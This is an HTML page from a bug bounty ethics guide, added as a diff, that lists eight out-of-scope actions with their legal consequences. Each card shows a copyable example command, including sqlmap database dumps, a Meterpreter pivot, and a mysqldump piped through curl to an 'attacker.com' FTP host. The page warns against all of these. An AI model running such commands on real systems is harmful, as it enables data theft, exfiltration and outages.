@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="theme-color" content="#050810">
+  <title>Out of Scope Actions — FORBIDDEN TOOLS</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .oos-card{background:var(--panel);border:1px solid var(--border);border-left:4px solid var(--red);padding:20px 22px;border-radius:3px;transition:background .18s,border-left-color .18s;}
+    .oos-card:hover{background:var(--panel2);border-left-color:var(--orange);}
+    .oos-num{font-family:var(--mono);font-size:9px;color:var(--sub);letter-spacing:2px;margin-bottom:8px;}
+    .oos-action{font-size:14px;font-weight:600;color:#fff;margin-bottom:10px;}
+    .oos-cmd{font-family:var(--mono);font-size:11px;color:var(--purple);background:rgba(180,76,255,.08);border:1px solid rgba(180,76,255,.18);padding:6px 10px;border-radius:3px;display:block;margin-bottom:10px;word-break:break-all;cursor:pointer;}
+    .oos-cmd:hover{border-color:rgba(180,76,255,.4);}
+    .oos-what{font-size:12.5px;color:var(--dim);line-height:1.5;margin-bottom:8px;}
+    .oos-result{font-size:12px;color:var(--red);font-weight:600;}
+  </style>
+</head>
+<body>
+<div id="nav-placeholder"></div>
+
+<div class="page-hero">
+  <div class="page-hero__grid"></div><div class="page-hero__glow"></div>
+  <div class="container container--narrow">
+    <div class="page-hero__badge">CATEGORY 08</div>
+    <h1 class="page-hero__title">Out-of-Scope<br><span>Actions</span></h1>
+    <p class="page-hero__sub">Actions that turn <strong class="text-red">perfectly legal tools into criminal acts</strong>. Any tool becomes illegal the moment you use it outside your authorized scope — intent does not matter.</p>
+  </div>
+</div>
+
+<main class="container" style="padding-top:24px">
+
+  <div class="section__head" style="display:flex;align-items:flex-end;gap:16px;margin-bottom:28px;padding-bottom:16px;border-bottom:1px solid var(--border)" data-reveal>
+    <div style="font-family:var(--display);font-size:52px;color:var(--red);opacity:.18;line-height:1">01</div>
+    <div style="font-family:var(--display);font-size:28px;letter-spacing:3px;color:#fff">Illegal <span class="text-red">Actions</span> &amp; What They Do</div>
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:14px" class="mb-lg">
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 01</div>
+      <div class="oos-action">Testing out-of-scope subdomains</div>
+      <code class="oos-cmd" data-copy="nmap -sV out-of-scope.target.com">nmap -sV out-of-scope.target.com</code>
+      <div class="oos-what">Even though nmap is a legal tool, running it on assets not listed in your scope is unauthorized access to a computer system. The program's legal protection only covers explicitly listed assets. "I was just scanning" is not a valid defence — intent to access is enough.</div>
+      <div class="oos-result">→ Unauthorized computer access charge under CFAA</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 02</div>
+      <div class="oos-action">Dumping real user PII from a database</div>
+      <code class="oos-cmd" data-copy="sqlmap --dump -T users -D prod_db">sqlmap --dump -T users -D prod_db</code>
+      <div class="oos-what">Once you confirm SQLi exists, your job is to document and report it — not extract data. Running --dump pulls real customer names, emails, passwords, addresses, and payment information out of the production database. This is data exfiltration: you now possess stolen personal data, which triggers GDPR, CCPA, and criminal data theft statutes on top of CFAA charges.</div>
+      <div class="oos-result">→ GDPR / CCPA data breach + criminal data theft charges</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 03</div>
+      <div class="oos-action">Pivoting to internal networks after RCE</div>
+      <code class="oos-cmd" data-copy="run post/multi/manage/shell_to_meterpreter">run post/multi/manage/shell_to_meterpreter</code>
+      <div class="oos-what">Getting RCE on a web server is a critical finding — stop there and report it. Pivoting through the server into the internal corporate network means you are now accessing systems that were never in scope, interacting with production databases, internal infrastructure, and potentially other companies' systems hosted in the same environment.</div>
+      <div class="oos-result">→ Felony unauthorized access — years in federal prison</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 04</div>
+      <div class="oos-action">Selling or holding a vulnerability unreported</div>
+      <code class="oos-cmd">(any exploit held, sold on dark markets, or shared with third parties)</code>
+      <div class="oos-what">Bug bounty programs give you a legal safe harbour only if you report findings promptly through their disclosure process. Sitting on a vulnerability, selling it to a third party, or using it for personal gain turns you from a researcher into a criminal. Zero-day brokers do not protect you — they expose you to law enforcement in every jurisdiction where the target operates.</div>
+      <div class="oos-result">→ Criminal liability for weaponizing + selling exploits</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 05</div>
+      <div class="oos-action">Scanning AWS / Cloudflare infrastructure</div>
+      <code class="oos-cmd" data-copy="nmap -sV ec2-xx-xx.compute.amazonaws.com">nmap -sV ec2-xx-xx.compute.amazonaws.com</code>
+      <div class="oos-what">AWS, Cloudflare, and other cloud infrastructure providers are third-party platforms — they are never in the scope of a bug bounty program targeting a web application. Scanning AWS EC2 instances, RDS endpoints, or Cloudflare IPs directly means you are attacking Amazon or Cloudflare's infrastructure, not your target's. Their legal and abuse teams respond aggressively to unauthorized scanning.</div>
+      <div class="oos-result">→ AWS / Cloudflare legal team pursues you directly</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 06</div>
+      <div class="oos-action">Exfiltrating real user data as "proof"</div>
+      <code class="oos-cmd" data-copy="mysqldump prod_db > dump.sql && curl -T dump.sql ftp://attacker.com">mysqldump prod_db > dump.sql &amp;&amp; curl -T dump.sql ftp://attacker.com</code>
+      <div class="oos-what">Programs never require you to exfiltrate real data to prove a vulnerability. A screenshot of one record with PII redacted, or a dummy record you inserted yourself, is always sufficient proof. Pulling and transferring a full database dump means you have committed data theft and data exfiltration — two separate additional crimes on top of the access violation.</div>
+      <div class="oos-result">→ Data theft + exfiltration charges + civil lawsuit from platform</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 07</div>
+      <div class="oos-action">Testing third-party login providers</div>
+      <code class="oos-cmd"># Probing Google OAuth, Facebook Login, Apple SSO, Okta endpoints</code>
+      <div class="oos-what">When you exploit a bug that involves a Google OAuth or Facebook Login endpoint, you are touching Google's and Facebook's infrastructure — neither of which authorized you. Even if the vulnerability lives in how the target site handles the OAuth callback, directly probing the identity provider's servers is out of scope and the IdP's security team will report you.</div>
+      <div class="oos-result">→ Out of scope — Google / Meta / Apple legal pursues you</div>
+    </div>
+
+    <div class="oos-card" data-reveal>
+      <div class="oos-num">ACTION 08</div>
+      <div class="oos-action">Aggressive automated scanning on production</div>
+      <code class="oos-cmd" data-copy="sqlmap -u 'https://prod.target.com/api?id=1' --level=5 --risk=3 --dbs">sqlmap -u 'https://prod.target.com/api?id=1' --level=5 --risk=3 --dbs</code>
+      <div class="oos-what">sqlmap at level=5, risk=3 sends time-based blind payloads, heavy union injections, and stacked queries that can corrupt database integrity, lock tables, consume all available DB connections, and cause real production downtime. Even if the target is in scope, causing actual damage or outage — even accidentally — removes your safe harbour and can result in civil damages claims against you personally.</div>
+      <div class="oos-result">→ Can corrupt production data + legal action for damages</div>
+    </div>
+
+  </div>
+
+  <div class="alert alert--danger mb-lg" data-reveal>
+    <span class="alert__icon">⚖</span>
+    <strong>Scope is your legal contract.</strong> The moment you step outside it, you lose all protection provided by the bug bounty program. You become an unauthorized attacker in the eyes of the law — regardless of intent, regardless of how you found the target.
+  </div>
+
+  <div class="page-nav" data-reveal>
+    <a href="mitm.html" class="btn btn--outline">← MITM / NETWORK</a>
+    <a href="rules.html" class="btn btn--primary">⚖ THE GOLDEN RULES →</a>
+  </div>
+  <div style="height:60px"></div>
+</main>
+
+<div id="footer-placeholder"></div>
+<script src="js/components.js"></script>
+</body></html>
